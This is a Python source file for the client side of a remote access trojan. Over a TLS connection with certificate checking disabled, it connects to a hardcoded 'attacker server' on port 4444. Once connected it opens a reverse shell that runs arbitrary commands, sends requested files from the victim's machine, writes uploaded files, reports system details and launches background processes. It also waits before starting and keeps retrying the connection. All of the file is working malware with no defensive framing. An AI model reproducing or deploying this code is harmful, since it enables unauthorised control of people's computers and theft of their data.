
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
import ssl
import platform
import time
import sys

def open_reverse_TCP():
    
    cwd = os.getcwd()
    Client_Socket_SSL.send(cwd.encode())    
    
    
    while True:
       
        command = Client_Socket_SSL.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            
            return
          
        if splited_command[0].lower() == "cd":
            
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
               
                output = str(e)
            else:
               
                output = ""
        else:
          
            try:
                output = subprocess.getoutput(command)
                
            except subprocess.SubprocessError as e:
                output = 'Cannot send the message'
                #print(e)
            
       
        cwd = os.getcwd()   
       
        message = (output+SEPARATOR+cwd).encode()
        Client_Socket_SSL.send(message)
  


def estabilish_SSL_conection(Client_Socket):
    
    context = create_context_SSL()
    Client_Socket_SSL = context.wrap_socket(Client_Socket,server_hostname = host)
    return Client_Socket_SSL
    
def create_context_SSL():
   
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False   
                        			 
    context.verify_mode = ssl.CERT_NONE 
    return context

def send_file():
    
    Client_Socket_SSL.send("<<Ready>>".encode())  
    
    try:
        path_file = Client_Socket_SSL.recv(BUFFER_SIZE).decode() 
    except socket.timeout:
        return
    
    if os.path.exists(path_file):
           
        with open(path_file, 'rb') as file:
            
            data = file.read(1024)
            
            while data:
                
                Client_Socket_SSL.send(data)
                data = file.read(1024)
    else:
         Client_Socket_SSL.send('The file does not exist')
         return

def receive_file():
    
    
    Client_Socket_SSL.send("<<Ready>>".encode())
   
    try:
        path_file = Client_Socket_SSL.recv(BUFFER_SIZE).decode() 
    except socket.timeout:
        return
    
    if os.path.exists(path_file):
        Client_Socket_SSL.send("found".encode()) 
        
        try:
            path_file = Client_Socket_SSL.recv(1024).decode()
        except socket.timeout:
            return
        
        with open(path_file, 'wb') as archivo:
            
            Client_Socket_SSL.settimeout(4)
            while True:
                try:
                    data = Client_Socket_SSL.recv(1024)
                    if not data:
                        break
                   
                except socket.timeout: 
                    Client_Socket_SSL.settimeout(None)
                    break
                
               
                archivo.write(data)
            return
    else:
         Client_Socket_SSL.send("not-found".encode())
         return
    
   
    

def call_handler(command):
     
     if (command == 'system-data'):
         send_data_system()
     if (command == 'reverse'):
        #execute reverse shell function
        open_reverse_TCP()     
     if (command == 'execute'):
         execute()
     if (command == 'close-conection'):
         Client_Socket_SSL.close()
         sys.exit()         
     if (command == 'download-file'): #read and send a file to the server
        send_file()
     if (command == 'upload-file'):
        receive_file()
    
     
def send_data_system():
    
    if(operating_system=='Windows'):
        output = subprocess.getoutput('wmic os get Caption, OSArchitecture')
        clean_output = output.replace('Caption','').replace('\t','').replace('\n','').replace('OSArchitecture','').lstrip()
        Client_Socket_SSL.send(clean_output.encode())
        
    if(operating_system=='Linux'):
        Client_Socket_SSL.send(subprocess.getoutput('uname -a').encode())
        
    if(operating_system!='Windows')and(operating_system!='Linux'):
        Client_Socket_SSL.send('Unrecognized system info'.encode())
    
def execute():
    
    Client_Socket_SSL.send("<<Ready>>".encode())  
    command_server = Client_Socket_SSL.recv(BUFFER_SIZE).decode()
    command_server = command_server.split()
    Client_Socket_SSL.send("Status: Running Process in background".encode()) 
    subprocess.Popen(command_server)  
    
    
if __name__ == "__main__":

    #--------GLOBALS--------------------
   
    time.sleep(60) 
  
    host = '192.168.0.1'  # the ip of attacker server
    port = 4444   # listen port 
    BUFFER_SIZE = 1024*128
    SEPARATOR = "<Sep>"
    operating_system = platform.system()  
    RETRY_TIME = 900 
    #--------------------------------------ssl------------------------------
    
    Client_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Client_Socket_SSL = estabilish_SSL_conection(Client_Socket)
    
    #------------------------------------------------------------------------
    
    while True:
        try:

            Client_Socket_SSL.connect((host, port))
            while True:  
                
                command = Client_Socket_SSL.recv(BUFFER_SIZE).decode()  #always listening to the server
                call_handler(command)
                
        except socket.error as e:
            #print(str(e))
            time.sleep(RETRY_TIME)  
        except Exception as e:
            time.sleep(RETRY_TIME)
            
            

    